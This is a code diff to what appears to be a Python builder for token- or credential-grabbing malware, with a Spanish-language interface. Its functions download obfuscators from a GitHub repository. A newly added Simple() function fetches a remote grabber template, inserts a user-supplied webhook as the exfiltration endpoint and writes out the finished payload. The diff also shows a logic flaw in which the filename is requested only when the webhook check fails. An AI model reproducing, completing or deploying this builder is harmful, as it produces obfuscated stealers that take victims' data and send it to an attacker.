@@ -27,6 +27,9 @@ def Lilith():
     except PermissionError:
         input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Hubo un error al intentar borrar el archivo temporal.")
 
+
+
+
 def Hyperion():
     x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/hyperion.py')
     f = open('hyperion.py', "w+", encoding="utf-8")
@@ -41,21 +44,26 @@ def Kramer():
 
 def OldXor():
     x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/OldXor.py')
-    f = open('OldXor.py', "w+")
+    f = open('OldXor.py', "w+", encoding="utf-8")
     f.write(x.text)
     f.close()
 
 def Apocalypse():
     x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/apocalypse.py')
-    f = open('apocalypse.py', "w+")
+    f = open('apocalypse.py', "w+", encoding="utf-8")
     f.write(x.text)
     f.close()
 
 def Blank():
     x = get('https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/obfctrs/blank.py')
-    f = open('blank.py', "w+")
+    f = open('blank.py', "w+", encoding="utf-8")
     f.write(x.text)
     f.close()
+
+
+
+
+
 
 def Hazard():
     try:
@@ -101,6 +109,21 @@ def W4sp():
 
     except (KeyboardInterrupt, EOFError):
         W4sp()
+
+def Simple():
+    try:
+        System.Clear()
+        webhook = input(f"\n {MK4}[{MK5}*{MK4}]{Colors.white} Ingresa la Webhook {Colors.red}> {Colors.white}")
+        if not check_webhook(webhook):
+            filename = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Nombre del Archivo {Colors.red}> {Colors.white}")
+        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/simple.py").text.replace("here", webhook)
+
+        with open(f"{filename}.py", 'w', errors="ignore") as f:
+            f.write(code)
+        input(f" {MK4}[{MK5}*{MK4}] {Colors.white}Presiona enter para continuar...")
+
+    except (KeyboardInterrupt, EOFError):
+        Simple()
 
 def check_webhook(hook):
     msg = '"Unknown Webhook"'
